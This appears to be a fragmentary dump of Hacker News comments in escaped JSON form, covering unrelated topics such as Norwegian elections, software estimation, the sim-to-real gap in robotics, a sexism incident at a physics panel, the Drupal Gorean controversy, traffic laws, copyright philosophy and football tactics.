There have been a number of\nsituations where there have been important cases where they've tried to\nenforce a specific vote and members have left the party in question in order\nto vote as they pleased, which makes the parties careful about when they use\nthose mechanisms.\n\nBut the ability for smaller parties to get in also mean that each of the\nparties are far more homogenous than the US parties, for example, so it's\nnatural for them to toe the party line to a reasonable extent for important\nvotes. In US terms, most of the parties in the current Norwegian parliament\nwould've been members of the Democratic Party, but in Norway that span is\nconsidered so wide that it would be unthinkable for any of the current parties\nto merge.\n\nIn terms of barriers, there's a 4% limit below which you need to get in on\ndirect votes, but no other limits (other than being able to fill a list, so\nyou need at most a couple of dozen people willing to put their names on each\nregional list for parliamentary elections - a low enough number that even\nparties with a few hundred members have no problems fielding lists in\nparliamentary electins). The way the Norwegian system works is that most seats\nare tied to a region, so there's, say (I haven't looked up the actual number\nrecently), 18 seats for Oslo. Each party provides an ordered list. So for the\nfirst 2 people on a party list to get in on direct votes, they need the total\nnumber of votes for Oslo \/ number of seats * 2, or more.\n\nAll the parties that get more than 4% nationwide then shares in a pot of\nadditional seats that are used to even out _their_ share to best match the\nactual nationwide percentages. Which regional party list is awarded the seat\ndepends on who got closest to getting in, but the party is determined based on\nproportion of the vote.\n\nThe combination of this is that small parties have a chance of getting in - it\ntakes 15.000-20.000 or so votes per region to win a seat - and larger parties\nproportions are further evened out so there's no tactical advantages in\nfighting harder for \"close\" seats.

Maybe. Maybe not.\n\nIs it relevant to situations where people decide to smile with the intent of\ntrying to force an emotional change?

They specifically tried to \"engineer\naway\" peoples knowledge about whether or not they were smiling or of someone\ntrying to affect their emotional state.

It's an incredibly wrong headed effort\nat taking mass production estimate techniques (where zero creativity is\nrequired) and applying it towards a creative endeavor. It makes as much sense\nas asking \"how many innovations per hour can the team accomplish?\" \"or how\nmany paintings can a team of painters crank out per day?\".\n\nWhat I think bothers me the most is how this is treated in management\neducation. At its simplest, you start with a roll of the die, because any\nestimate is essentially a Wild Ass Guess (WAG). But then, realizing that\nsoftware deadlines are never met, the management discipline tries to use\nvarious structured techniques for estimating, like complex work breakdown\nstructures and critical path analysis blah blah blah, which of course simply\nuse WAGs at a finer level of granularity and do little but generate busy work\nfor the managers. Instead of one WAG, we now have dozens or hundreds of small\nWAGs.\n\nOf course none of this provides a better estimate of time, but might include\ngems like when aggregating your WAGs from a work breakdown structure to derive\na total project estimate, add 20% to each small WAG to build in \"slack time\"\nwhich is another way of saying \"we don't really know how long it'll take, so\nwe're going to over estimate as a Check Your Ass (CYA) maneuver, if we\nestimate out long enough, all work will get done early!\". Brilliant. Modern\nmanagement practices have now turned from coordinating and organizing complex\nefforts into professional CYA endeavor.\n\nI think there's light at the end of the tunnel, most of this nonsense is a\nresult of trying to scope box projects, which makes sense when building a\nbridge, or making millions of widgets, but makes little sense when building\nnew software. There's obviously a need for setting deadlines, as anybody who's\never managed a \"when it's done\" software project knows...that only asks for\n\"Duke Nukem Forever\" problems. Setting deadlines keeps people on task and\nmotivated.\n\nSo the solution? What do your business needs dictate in terms of delivery\ntime? Then timebox to that. If features don't get built by that time, too bad.\nSoftware, unlike building a bridge, is a _continuous_ practice. You can build,\ndeliver and then rev to fix, extend, addend software that didn't hit the\ndesired scope. It eliminates lots of the CYA and WAG nonsense, and forces\npeople to try and get as much as possible done in the allotted time anyways.\nIt keeps the development team from going into (what I consider) largely\nunethical extended crunch periods near or after a WAGs arbitrary deadline.\nThey'll simply focus on what they _can_ deliver. It's descriptive of their job\ninstead of proscriptive. It implicitly creates the understanding that full\nfunctionality is not the goal for a milestone.\n\n\"Build as much as you can by x\" makes more sense than \"How long will it take\nto build all of Y?\".\n\n","3147":"I would argue that most android phones sold have larger than iPhone screens\nand most phones sold globally are android phones.\n\n","3148":"Oh yes.

To be honest there are not many references to it\nthat I could find online, but this post by the Google AI blog starts with a\nvery good summary (then proceeds to propose one way to overcome the\ndifficulties of training on simulations, though of course the problem is still\nfar from solved):\n\nhttps:\/\/ai.googleblog.com\/2017\/10\/closing-simulation-to-real...\n\n _Simulating many years of robotic interaction is quite feasible with modern\nparallel computing, physics simulation, and rendering technology. Moreover,\nthe resulting data comes with automatically-generated annotations, which is\nparticularly important for tasks where success is hard to infer automatically.\nThe challenge with simulated training is that even the best available\nsimulators do not perfectly capture reality. Models trained purely on\nsynthetic data fail to generalize to the real world, as there is a discrepancy\nbetween simulated and real environments, in terms of both visual and physical\nproperties. In fact, the more we increase the fidelity of our simulations, the\nmore effort we have to expend in order to build them, both in terms of\nimplementing complex physical phenomena and in terms of creating the content\n(e.g., objects, backgrounds) to populate these simulations. This difficulty is\ncompounded by the fact that powerful optimization methods based on deep\nlearning are exceptionally proficient at exploiting simulator flaws: the more\npowerful the machine learning algorithm, the more likely it is to discover how\nto \"cheat\" the simulator to succeed in ways that are infeasible in the real\nworld. The question then becomes: how can a robot utilize simulation to enable\nit to perform useful tasks in the real world?_\n\n _The difficulty of transferring simulated experience into the real world is\noften called the \"reality gap.\" The reality gap is a subtle but important\ndiscrepancy between reality and simulation that prevents simulated robotic\nexperience from directly enabling effective real-world performance. Visual\nperception often constitutes the widest part of the reality gap: while\nsimulated images continue to improve in fidelity, the peculiar and\npathological regularities of synthetic pictures, and the wide, unpredictable\ndiversity of real-world images, makes bridging the reality gap particularly\ndifficult when the robot must use vision to perceive the world, as is the case\nfor example in many manipulation tasks._\n\nNote the bit about deep learning algorithms being very proficient \"cheaters\",\nwhich I missed in my comment above. Indeed, one way to fail to generalise from\na simulation to the real world is to \"overfit\" to the defects in the\nsimulation!\n\nLike the linked blog post, most material you are likely to find online focus\non training robots with (deep) Reinforcement Learning, I think because that\njust happens to be one domain where it is even harder to collect training data\nthan good old supervised learning for image recognition. I can find virtually\nno source referring to the \"reality gap\" in the context of purely machine\nvision research- it's just not the done thing to train vision algorithms on\nsimulated data, for the reasons described above, consequently it's very\ndifficult to find hard data on why it's not done.\n\nA good related source (with a bazillion references) is the following blog\npost, discussing the difficulties of deep RL, which is primarily trained on\nsimulated environments:\n\nhttps:\/\/www.alexirpan.com\/2018\/02\/14\/rl-hard.html\n\nThe post makes only passing referenct to the \"reality gap\" but it should give\na good idea about the ins and outs of training in simulated environments.\n\n","3306":"In Prolog it's very common to use single- or two-letter names for variables\n(which are all upper-case).

Maybe Ulbricht gets acquitted because he creates enough\nreasonable doubt that he isn't DPR, as he claims.

Since\nspending and taxation happen on different schedules, clustered tax payments on\none day would drain so much of the banks' reserves from Fed accounts that it\nwould force banks to borrow to maintain required reserves, thus creating a\nspike in the interest rate. Conversely, clustered spending would add reserves\nwhich would cause the interest rate to drop.\n\nSimply to prevent such fluctuations, the treasury and Fed operate accounts in\nprivate banks where tax money is accumulated, so that it does not cause a\ndrain on banks' reserves.\n\nThis happens to support monetary policy.

Or rather made me step into who I am in a larger way.\n\nAs some on my feed have seen, I was live-feeding the beginning of the panel\ndiscussion on FB. That panel was made up of some of the greatest and most\nfamous minds in the world in Inflationary Cosmology, String Theory, Cosmology\nand Physics based Philosophy. The panel was made up of 5 men and 1 woman. And\nthe moderator was a science writer and journalist for The New Yorker.\n\nIn the first hour of the panel discussion you can see clearly, if watching the\nvideo, that Veronika Hubeny, the only woman on the panel is barely given any\nopportunity to speak. And the Moderator, Jim Holt even acknowledges this.\n\nIn the last 20-30 minutes of the 90 minute discussion Jim Holt finally pushes\nthe conversation to Hubeny's field of expertise, string theory, and this is\nwhat ensued:\n\nHe asked her to describe her two theories of string theory that seem to\ncontradict one another.\n\nAnd THEN, without letting her answer, proceeded to answer for her and describe\nHER theories in detail without letting her speak for herself.\n\nWe could clearly see that she was trying to speak up. But he continued to talk\nover her and dominate the space for several minutes.\n\nI should say that this panel was taking place in a large auditorium as it is\nan extremely high-profile and always sold-out event. And the panel discussion\nwas being live-streamed across the world and they say that millions of people\nwatch these videos after they are made public. (Which they already are).\n\nSo at this point, after seeing very clearly that she was not going to be given\nspace to speak and in fact having her own theories described to the audience\nby the moderator, I am in full outrage. My body is actually beginning to\nshake. The sexism is beyond blatant. It is happening on stage and NO ONE, not\na single other physicist or panelist is stepping in to say anything about it.\nAnd I can hear other audience members around me, both men and women becoming\nmore and more agitated with what is happening. Jim Holt, even at one point,\nasks Veronica a question and she laughs because he has been answering his own\nquestions about her work...and he makes fun of her for 'giggling'.\n\nSo at some point while he is Still talking about Her theories, I just can't\nhandle it any longer.\n\nWith my hands shaking,\n\nI finally say from my seat in the 2nd row of the audience, as clearly,\ndirectly and loudly as possible;\n\n\"Let. Her. Speak. Please!\"\n\nThe moderator stops.\n\nThey all stop.\n\nThe auditorium drops into silence.\n\nYou could hear a pin drop.\n\nAnd then the audience explodes with applause and screams.\n\nJim Holt eventually sat back, only after saying I was heckling him\n\nAnd he let her speak.\n\nAnd of course, she was brilliant.\n\n\\-----------------------\n\nSo, the panel discussion ends.\n\nMy hands are still shaking. I'm still upset by the incredible sexism that has\nbeen demonstrated this afternoon. But I also realize that I just spoke up in\nan auditorium full of people that are listening to people that are considered\ngods in the international science world. I was just overwhelmed by it all\n\nWe get up to leave.\n\nAnd then it happens.\n\nPerson after person come up to me. Both men and women.\n\nThe first woman, right behind me, reaches over and embraces me and says, \"Oh\nmy god. what you said was the most important thing that was said all day.\nThank you. Thank you.\"\n\nAnd then people start filing out of their aisles and wind their way over to\nme:\n\n\"Was that you? Thank you so much for speaking up. Thank you.\"\n\n\"Was that you? Oh god, what he was doing was horrific. Thank you. I wanted to\ndo something but didn't know how\"\n\n\"Was that you? I wish I had the courage to say something, thank you! Thank you\nso much\"\n\n\"Was that you? You said what everyone here was thinking. Look I had even been\nwriting in my notebook what you eventually said (shows me his notebook with\n'let her speak' written over and over.) But you said it. You said it. Thank\nyou.\"\n\n\"Was that you? Thank you! I felt so powerless to do anything.\"\n\nAnd on.\n\nSo we were all thinking this.\n\n\\----\n\nSo I walked out. And my friend who was sitting about 8 rows behind me, came up\nto me with a huge grin and said\n\n\"That was you, wasn't it? Of course it was. YES!!!!! I will be telling this\nstory for years.\"\n\nAnd the whole time, my hands are still shaking. And I'm felling light-headed.\nAnd I just want to scream out into the lobby \"WHY IS THIS SEXISM STILL\nHAPPENING? WHY, does someone like me, with No status in that room, have to be\nso extraordinarily bold and speak up? And why was it so frightening to do so?\"\n\nAnd I'm thinking. \"God, please god let this be an opening for those that were\nhere today and the tens of thousands that watched the live-streaming of the\npanel yesterday and the hundreds of thousands that will watch the video this\nyear- to speak up when we see this happening. And please let me not be afraid\nto do this again\n\n...and again\n\n...and again\"\n\nBecause it was scary.\n\nPlease keep giving me courage.\n\n","3817":"I don't mind Electron, but Hyper has issues with Ctrl C so won't work on\nWindows until it's fixed.\n\nCmder is just conemu plus some extra things you probably don't want.\n\n","3818":"https:\/\/github.com\/jonschlinkert\/is-odd\/blob\/master\/index.js\n\nEdit:\n\nthe original code, even before the float handling, was was a perf\noptimisation:\n\n    \n    \n        !!(~~i & 1);\n    \n\nNobody wants to see that in code unless it has a name.

I only speak 3 languages reasonably fluently, and\nhave a basic to moderate understanding of a few others. It's not like there's\nany scientific backing for this method, though.\n\nStep 1: bootstrap. Before you can really learn the language, you need to set\nup some basic structures in your mind for that language. You need a basic\nunderstanding of grammar, a few useful sentence patterns, etc. You need those\nto be wired in so that they can be called upon in conversation, so just\nreading is no good - you have to both listen and speak. I've found the\nPimsleur courses to be excellent for this bootstrapping, especially those that\nhave 3 sets of lessons (3x30 half-hour lessons = pretty solid bootstrapping),\nbut even with just one you get some solid basics like simple sentences,\nnumbers, basic grammar, etc.\n\nStep 2: grow basic vocabulary. Even after bootstrapping, you'll still have a\nvocabulary that's way too limited to engage in meaningful conversation (though\nat least you can have uber-simple conversations like asking for prices,\ndirections, and being polite). At this point you need vocabulary - a lot of\nit. The best way I've found to build this is to read, with a good dictionary\nand (if the language needs it) verb conjugation book handy so that you can\nactually understand things. Basically, take beginner-level reading materials,\nand, with a pencil in hand, read, paragraph by paragraph. While you read the\nparagraph, underline words you're not 100% sure about (but don't stop reading\nuntil you get to the end of the paragraph). Once you're finished with a\nparagraph, look things up and write the definitions in the margins. By the\ntime you've read 2-3 beginner books like this, you can probably handle a\nsimple conversation about a topic other than the price of a train ticket.\n\nStep 3: total immersion. This is the key step, and you can even skip the\nprevious two if you're in a rush, and go straight for that, but then it'll be\nvery hard and you'll waste a lot of \"prime time\" (i.e. time spent surrounded\nexclusively by native speakers) learning the basics you could have learned at\nhome. In this step, you need to speak only that language for at least a few\nweeks, ideally three months or so. Stay away from people who speak your native\nlanguage (i.e. don't hang around with exchange students or whatever, however\n\"safe\" that may seem, since it will destroy the main benefit of this). Speak\nonly the target language, and within a few weeks something magical will\nhappen: you'll switch from thinking in english and translating, to thinking\ndirectly in the target language. This is the holy grail. At this point, you\ncan speak. You may still have a LOT to learn (depending on the language...\ne.g. with Chinese, well done, you can speak - now you can learn to read\nideograms, which is twice as hard), but you've got enough of the building\nblocks that you don't need a deliberate system other than speaking to people\nin that language and reading stuff in that language.

According to Dries, the\nreason for banning Larry is this:\n\n _In the end, I fundamentally believe that all people are created equally.\nThis belief has shaped the values that the Drupal project has held since it 's\nearly days. I cannot in good faith support someone who actively promotes a\nphilosophy that is contrary to this. The Gorean philosophy promoted by Larry\nis based on the principle that women are evolutionarily predisposed to serve\nmen and that the natural order is for men to dominate and lead._\n\nThis sounds horrible, but I think it's just a misunderstanding. I believe that\nwhat Dries (and some commenters, like tptacek[1][2]) misses here is a very\nfundamental fact: BDSM is just a game, and \"Gor\" is just a series of science-\nfantasy novels.\n\nIn other words, even if Larry did say somewhere that \"females are subhuman\"\nit's not enough to conclude that this is what he believes in, even less that\nhe would act on these beliefs. It may look pretty bad - whatever he said or\nwrote[5], we don't know[3] - when taken out of context, but without solid\nevidence to the contrary I assume the context here is BDSM. Saying things like\nthese is expected and normal within the bounds of the scene and in\nconversations about it[6].\n\nAgain: default assumption when it comes to BDSM is that it's an act, a game\nplayed between consenting adults. Dries seems to be convinced that there is\nenough evidence[4] to say that this assumption does not apply here. As an\noutsider, I find it hard to believe him without seeing the evidence myself. In\nmy experience, it's more often the case that the shocked observers don't know\n(or don't want to know) the convention and interpret what they see out of\ncontext.\n\nTo summarize: without further evidence and based on the knowledge of what BDSM\nis about I think it's safer to assume that someone did take offense (contrary\nto Dries claim[7]) to something he didn't fully understand, which resulted in\ncurrent situation.\n\n[1] https:\/\/news.ycombinator.com\/item?id=13961655\n\n[2] _Since the beliefs that we 're talking about could be broadly and probably\ninaccurately but by how much I don't know described as \"females are subhuman,\"\nit's the perspective of the Drupal members who did the ousting that those\nbeliefs matter very much to the project._\n\n[3] _it is not for me to share any of the confidential information that I 've\nreceived,_\n\n[4] _However, I can tell you that those who have reviewed Larry 's writing,\nincluding me, suffered from varying degrees of shock and concern._\n\n[5] There is no mention anywhere about actually _doing_ something wrong.\n\n[6] tptacek writes that \"[...] the claim here [...] is that proselytizing was\nin fact an issue.\" \\- but that would only be a problem had Larry tried to\nconvince someone that \"females are subhuman\", and again, given that the only\ncontext given is \"BDSM\" I assume he didn't. He may have said something which\ncould be interpreted as such, but that's not really the same thing as\nconsciously \"promoting\" \"the philosophy.\"\n\n[7] _I also don 't take any offense to the role-playing activities or sexual\npreferences of Larry's alternative lifestyle._\n\n","3950":"> They literally don't have a toilet.

Single-pane designs. Multiple columns, especially online, for _main\ncontent_ text, is too hard to follow. In a cards-type presentation (e.g., G+)\na 2-column display somewhat works, but 3 columns to me simply becomes noise. I\nthink a multi-column (newspaper-like) display might work _if you had explicit\nheight alignments_ , see a site like http:\/\/freshnews.org, very old-school,\nbut which essentially has a 3-column grid, and compare with, say, the NYTimes\ndesktop layout. Note that new column heights aren't simply random, but tend to\nbe lined up across the page, or at least a section of it.\n\n2\\. A flexible main-body text width, but maximising at about 35-45 em. Look up\n\"Edward Morbius's motherfucking web page\" on CodePen.io for my interpretation\nof a popular meme, and pretty much how I style my own content. It's a very\nminimal ruleset. Pocket and Readability are good models.\n\n3\\. A paginated, two-page-up mode, for desktop \/ widescreen mode. See many\neBook readers or the Internet Archive's Bookreader in 2-up mode. This gives\nfocus on a single page at a time, but the ability to reference across two\npages. I use a tablet in portrait (1-up) mode a lot, and prefer being able to\nreference back and forth across two pages. A fixed pagination also feeds my\nspatial memory for _where_ something was on a page. Pocket has a paginated\nmode, but it's dynamic, changing to wherever you've scrolled a page. I dislike\nthat.\n\n4\\. Except for the _very_ narrowest display, at least a minimum margin on\nsides. I'll usually set 1-2em for even a small-factor mobile device, and\nprefer 4-5em for most widths. As text body reaches 45em, center the main body.\nText that runs flush to the screen edge, or is sharply asymmetric on the page,\nis quite annoying.\n\n5\\. Use those margins.

While I try to drive legally, as a pragmatic measure\nbecause I value my driving licence, I have less respect for traffic laws than\njust about any other kind.\n\nLet me be very clear: I am all in favour of promoting safe and considerate\ndriving, and I have nothing against punishing those who do drive dangerously\nor inconsiderately, including punishing them severely if this is proportionate\nto the likely consequences of their actions. I just don't feel that the kind\nof arbitrary, black-and-white laws that we have today are really helping that\ngoal.\n\nIn my country, the speed limit on our fastest roads is 70mph. If you do 71mph,\neven on clear roads with a well maintained vehicle on Christmas morning, then\ntechnically you are a criminal. On the other hand, if you drive past a school\nat 29mph, in the wet, just as the kids are coming out at the end of the day,\nwith parked cars obscuring your view everywhere, then you are unlikely to be\nprosecuted unless you actually hit someone, because you're under the 30mph\nlimit. The idea that your driving might be considered dangerous (and this\nmight reasonably be argued in court) if you're not breaking some arbitrary\ntechnical limit doesn't seem to occur to prosecutors, and the penalties for\ngeneric dangerous driving type offences are often laughable; you can get less\npenalty for killing someone through absurdly dangerous driving than you can\nfor many much less serious crimes not involving the use of a car.\n\nSimilar problems apply with:\n\n\\- banning hand-held mobile phones (yes, they're dangerous, but so are hands-\nfree kits to almost the same degree),\n\n\\- drunk driving (more than a certain blood alcohol threshold and you're\ndangerous enough to throw to the wolves, but just under and you're fine, even\nthough people's tolerance varies greatly and someone slightly under might in\npractice be driving much worse than someone slightly over),\n\n\\- mandatory bus\/cycle lanes (so entering them even when you can see they are\ncompletely clear for a long distance is illegal, even if it's just to pass a\nvehicle in front waiting to turn the other way, and traffic is required by law\nto queue up behind the waiting vehicle instead),\n\n\\- red lights for turns that don't cut across any other traffic (so you have\nto wait even in the middle of the night, on a completely clear junction),\n\n\\- and, yes, complete-stop-no-really-we-mean-it-lines, for similar reasons.\n\nThe problem with such laws is partly that they are designed more for ease of\nautomatic enforcement than in the interests of justice, and partly because as\na consequence of the repeated black-and-white approach, many drivers\nincreasingly take the view that if something is not explicitly proscribed by\nlaw then they can do it, and even if it is proscribed they can still do it if\nthey think they can get away with it.\n\nWouldn't it be better if we had traffic laws that were actually in sync with\nwhat most experienced drivers would consider reasonable behaviour, and then\nused actual police officers for enforcement, giving them actual powers to stop\nand challenge people who are actually driving dangerously or inconsiderately?\nBut of course that's too expensive and requires difficult things like making a\nreal case in court using real evidence that somene's behaviour was actually\nharmful, so cameras it is.\n\n","4280":"Doesn't that basically mean that LinkedIn is a fool's game?

If the court finds that the case was without\nmerit, they might be able to compensate the successful party in some way\ndepending on your particular legal system, but that would probably happen\nlater.\n\nWhat's more, if you created a system for someone, that system requires\nmaintenance, your original contract did not specify who was responsible for\nthat maintenance, and your clients sue claiming that they already paid for you\nto do that work and you're refusing to do it, you could well find yourself on\nthe wrong end of a judgement.\n\nIn short, you seem to have quite a few misunderstandings about the basics of\nhow contract law works, unless your local jurisdiction is a lot different to\nmost.

Suppose you have a piece of land which is completely unused:\nnobody lives or visits there, nothing is being built there, nor is the land\nheld with the explicit intent of being left in its natural state. In that\ncase, since the value of the land is being wasted, there is some merit to the\nidea that it should morally be usable by other people (although keep in mind\nthat the current owner might want to do something with it in the future). And\nin fact, if the owner is negligent enough, adverse possession allows someone\nelse to do so in many jurisdictions. There is also common land and literal\ntragedies of the commons...\n\nIn all other cases, someone is getting some use out of the land, and in\ngeneral allowing anyone else to use the same land would impair that use. (In\nsome special cases, there are again laws on the matter: in most US states it\nis illegal to hunt on others' private property, but only if the owner posted a\nsign or applied specially colored paint. If not, since the hunting would\nlikely have minimal impact on rural property, it is allowed.) Perhaps,\naccording to someone's standard, the owner is making inefficient or wasteful\nuse of the land; perhaps they have barely changed it from its natural state,\nwhile a developer would like to add it to their adjoining property full of\nvaluable businesses or whatnot. But this is subjective, and doesn't change the\nfact that the 'better' uses would deprive the current owner of something -\ndepending on the owner's sentimental attachment to the land, potentially\nsomething subjectively irreplaceable.\n\nI do not have enough knowledge to directly argue in favor of capitalism. There\nare plenty of theories under which to posit that the current owner should be\ndeprived anyway in the interest of the common good. But at least it is clear\nthat our current system has certain significant benefits.\n\nTo take the argument to its obvious conclusion, for copyrighted works, the\npublic domain would at most deprive someone of money they could potentially be\nmaking, which is hardly the same thing. Meanwhile, it would allow many\ndifferent people to enjoy passive use of, or build interesting things on, the\nsame property without getting in each other's way. The flipside is of course\nthe standard justification for copyright: the prospect of that money\nencourages people to be creative, and getting that money allows them to make a\nliving through creativity. But this does not mean copyright has to last\nforever. (It also doesn't inherently imply copyright should a right of\nexclusive control; in the special case of radio broadcasts of songs, making it\npurely a mandatory royalty, open to all by law, seems to have worked out\npretty well. And then you get to fair use, but of course there are far more\ndetailed arguments to be found there.)\n\nBut you know all that. In another post, you said:\n\n> While that's one philosophical justification for property, we've had\n> property long before anyone coined the phrases \"rivalrous\" or \"excludable\"\n> and it has been justified for reasons that have nothing to do with those\n> economic concepts: http:\/\/en.wikipedia.org\/wiki\/Labor_theory_of_property.\n> Going back further, see Psalm 128:2 (\"For thou shalt eat the labour of thine\n> hands: happy shalt thou be, and it shall be well with thee.\")\n\nFor one thing, I don't think coining the phrases \"rivalrous\" or \"excludable\"\nmeans much. If you're making a theory of property, where property is defined\nas actual physical objects or land, you don't need to make up terms to\ndescribe what obviously applies to all property; it's only when you start\ncalling data property that you have to distinguish it from the rest. Any older\nphilosophical argument in favor of property, regardless of whether it\nexplicitly addresses the matter, was written, and should be read, with some\nbroad ideas in mind that do not apply to data. This certainly applies to the\nPsalm you cited.\n\nBut actually, Locke makes it quite explicit - right near the beginning of the\nchapter \"Of Property\" in his Second Treatise on Civil Government:\n\n _And tho ' all the fruits it naturally produces, and beasts it feeds, belong\nto mankind in common, as they are produced by the spontaneous hand of nature;\nand no body has originally a private dominion, exclusive of the rest of\nmankind, in any of them, as they are thus in their natural state: yet being\ngiven for the use of men, there must of necessity be a means to appropriate\nthem some way or other, before they can be of any use, or at all beneficial to\nany particular man. The fruit, or venison, which nourishes the wild Indian,\nwho knows no enclosure, and is still a tenant in common, must be his, and so\nhis, i.e. a part of him, that another can no longer have any right to it,\nbefore it can do him any good for the support of his life._\n\nThis is just stating the concept of \"rivalrous\" without using the word! And it\nclearly does not apply to intellectual property at all; when a basic premise\nof his argument is voided, we should be hesitant to apply his conclusions.\n\nedit: There is also the matter that as eager as philosophy is to be concluded\nfrom first principles, in general I think empiricism is superior. (And don't\nconfuse 'common wisdom' which at least somewhat reflects centuries of\nempiricism with first principles.) Capitalism has its moral arguments,\ncommunism has its moral arguments, and neither are necessarily wrong; in my\ndrastically oversimplified view, in practice it seems like pure communism\ndoesn't work out very well, but socialist economics tries to satisfy some of\nthe moral precepts of both in a more achievable way. But we haven't had\ncenturies of empiricism when it comes to intellectual property - not that long\na history of protection nearly as strong as today, and _certainly_ not of the\nfundamentally new practical properties of digital intellectual works.\n\n","4405":"Out of curiosity, is that a real example from some language?\n\n","4406":"The kernel and the root FS are now unencrypted - but not other things, such as\nthe bootloaders (iBoot, LLB) and the firmware for the SEP (Secure Enclave\nProcessor, used to handle things like Touch ID).\n\n","4407":"Actually, both clients have been named \u201cMessages\u201d as long as they\u2019ve supported\niMessage.\n\nThe iOS client has been \u201cMessages\u201d since iPhone OS 3.0; before that it was\ncalled \u201cText\u201d and had \u201cSMS\u201d written inside the chat bubble in the icon.\niMessage wasn\u2019t introduced until iOS 5.0.\n\nThe macOS client was originally \u201ciChat\u201d, then \u201ciChat AV\u201d, then \u201ciChat\u201d again;\nin this era it supported multiple protocols including AIM and Jabber.

There will be less of\nthe actually available \"stuff\" and the \"stuff\" will be more expensive. Such\nbasic \"stuff\" as \"food.\"\n\nThink about it: \"we managed to increase the agricultural output so predictions\nof the increased hunger in the world didn't come true\" etc. But how? Simply by\nspending more hydrocarbon-stored energy to produce the food. Only: 1) the\nstored hydrocarbon energy resources are limited. 2) We'll most probably\nirreversibly destroy the atmosphere balance as we know it even before we use\nup all the stored hydrocarbons. And the other effects are also easy to\nimagine. \"Steady growth\" is simply not sustainable.\n\nOnce again:\n\nhttps:\/\/www.e-education.psu.edu\/earth104\/sites\/www.e-educati...\n\n","4456":"There are, of course, different points of tradeoffs for everything related to\nsecurity.

You could combine those with some touring around the\nColli Euganei. Arqua Petrarca is a cute little town famous for being the final\nresting place of Petrarch, and a pleasant place in its own right. In terms of\nhistory, Monselice had its high point when it was the local center of power\nfor the Lombards - Padova fell along with the Roman empire. Montagnana, along\nwith Cittadella to the north of Padova, was an outpost against neighboring\ncity states. To this day, the province of Padova includes Montagnana and\nCittadella, whereas Treviso's own outpost, Castelfranco, delimits the edge of\nthat province.\n\nhttp:\/\/www.welton.it\/photos\/monselice\/\n\nhttp:\/\/www.welton.it\/photos\/colli_euganei\/\n\n\\- Central Italy is filling up with tourists: Umbria and Le Marche are a bit\nmore off the beaten path.

Keeping possession is a\nbigger tactical advantage than many people previously thought. Imagine an\nentire _team_ playing keep-away for the win, patiently building up to goals\nconfident they will get them, and you essentially have Barcelona:\nhttp:\/\/www.youtube.com\/watch?v=I6A_K8oWqfk\n\nZidane was more of an attacking midfielder, which makes his contributions all\nthe more obvious, but even Zidane himself knew that the core of a great team\nwas as far back as the often unheralded position of defensive midfield. When\nhis club Real Madrid sold Claude Makelele and bought David Beckham, Zidane\nremarked, \"Why put another layer of gold paint on the Bentley when you are\nlosing the entire engine?\"\n\nDespite the presence of more heralded players like Xavi, Iniesta, and Messi,\nBusquets is likewise the tactical centerpiece of Barcelona, almost purely due\nto his intelligence on the pitch. In defense, he drops back and positions\nhimself to intercept passes rather than challenging for the ball, and once he\nhas it he almost always makes the right decision where to put it next. And\nwhen Barcelona have possession, he pushes forward to form a triangle with the\nrest of the midfield, providing an open outlet to maintain possession and\nrecycle it. If you chart out the passes Barcelona make in a typical match,\nthere's usually a very heavy triangle between Xavi, Iniesta, and Busquets.\n\nThe most interesting part of Barcelona's tactic, though, is the way they seem\nto push even more players into the midfield. Their notional striker is Messi,\nbut in his \"false nine\" role he plays closer to attacking midfield. Likewise,\nBarcelona's defenders push forward and hold a very high line. Defensive\nmidfielders like Mascherano and even Busquets have been repurposed to play as\ncentral defenders, while Pique can make effective runs forward. Right-back\nDani Alves usually rushes forward to play as a winger.\n\nThe interesting thing about Barcelona's style of play is that, while it's\nobviously a tactic well suited for a team full of good passers who have played\nwith each other mostly since childhood, it can be surprisingly effective for\nother teams. Swansea have used it very effectively in the Premier League this\nseason, while Borussia M\u00f6nchengladbach have gone from near-relegation to the\nChampions League places: http:\/\/www.youtube.com\/watch?v=JAx9kYx8qo4\n\n","4570":"1961 was too early for hair to be that long then.

For example, Roger Penrose's stuff about physics\nand consciousness is a bit strange, and it probably wouldn't hurt if he cared\nmore about existing work in philosophy of mind. And Hawking's most recent book\nhas good science, and an interesting philosophical proposal of \"model-\ndependent realism\", but strangely refuses to consider it to be a philosophy\nproposal or discuss relevant existing positions.\n\nPhysicists veering off towards \"big-picture\" philosophy-ish stuff later in\ntheir careers isn't new, but this sort of seat-of-your-pants approach seems\nnewer. Looking at the philosophy-oriented works Max Planck wrote later in his\ncareer, for example, he's impressively well-read in both physics and\nphilosophy.\n\n","4654":"On the latter point, I haven't found that to be the case in CS. Sub-fields of\nCS work _completely_ differently. Some are entirely based around journals,\nsome conferences, some a hybrid. Some are very large, some small. Some are\nbased mainly on theoretical work, others mainly empirical. The empirical ones\ndiffer completely on what empirical work looks like: does it mean systems and\ndata, does it mean field work, does it mean psych-style user studies, does it\nmean longitudinal case studies? Some subfields value big budgets, big systems,\nand big data, others value mathematics, algorithms, and proofs. European,\nAsian, Australian, and US institutions also differ considerably inside each of\nthose subfields.\n\n","4655":"I agree that paper _per se_ isn't the advantage, but the fact that something\ncomes in a relatively unencumbered and self-contained unit does help a lot\nwith digital archiving. That is so far still more common with paper on\naverage. A library can build a more or less complete digital archive of a\npaper newspaper by simply subscribing to it and setting up a routine\ndigitization process. Building a complete archive of an online news site is\nmuch harder: you have to figure out how to scrape it in full, and many sites\nactively try to stop you from doing so. As publications have discovered that\nselling access to their own archives (or \"vault\" as some call it) is\nprofitable, they are even less likely to want free third-party archives to be\navailable.\n\nThe best-case for \"born digital\" archiving at the moment are probably\npublications that still produce a full PDF version of each \"issue\". For\nexample a library could archive The New Inquiry by simply subscribing and\ndownloading each month's subscribers-only PDF, rather than trying to scrape\nthe website. A publication that put the full content in an RSS feed would also\nbe fairly easy to \"subscribe\" to and archive. But most don't have an easy way\nof subscribing to full updates that can be archived and stored\/viewed\nindependently of the original site, and many are even kind of hostile to the\nidea.\n\nJournals are another problem. Paper journal subscriptions go into a library's\npermanent holdings, while digital journal subscriptions often give them\ncheaper per-issue prices, but in return it's more like renting access to the\njournal-controlled archive, which goes away if the library cancels the\nsubscription. Most don't allow a library to mass-download the archive into the\nlibrary's own digital holdings, though some do have some self-archival\narrangements (e.g. a library might be allowed to self-archive issues that came\nout during their period of subscription, but not the whole back catalogue).\n\n","4656":"My experience is that long-term image-based development isn't really that\ncommon in Lisp, maybe outside of some specialized use-cases.

The use of image-oriented development then\ngets limited to prototyping and debugging. Being able to redefine\nfunctions\/etc. on the fly (even during restarts and the like) is useful while\nexperimenting and debugging. But then the \"real\" code gets written into a\nsource file, which is reloaded into a fresh image to make sure it works.

